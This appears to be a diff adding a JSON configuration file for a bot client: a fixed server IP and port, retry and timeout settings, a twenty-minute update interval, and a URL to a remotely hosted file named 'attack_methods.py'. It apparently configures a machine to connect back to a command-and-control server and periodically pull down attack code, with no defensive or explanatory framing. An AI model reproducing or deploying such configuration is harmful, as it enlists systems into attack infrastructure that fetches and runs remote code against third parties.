@@ -1,1 +1,8 @@
-
+{
+    "host": "145.239.65.119",
+    "port": 20205,
+    "retry_wait": 30,
+    "connection_timeout": 45,
+    "methods_url": "https://raw.githubusercontent.com/Adamits1/files/refs/heads/main/attack_methods.py",
+    "update_time": 1200
+}
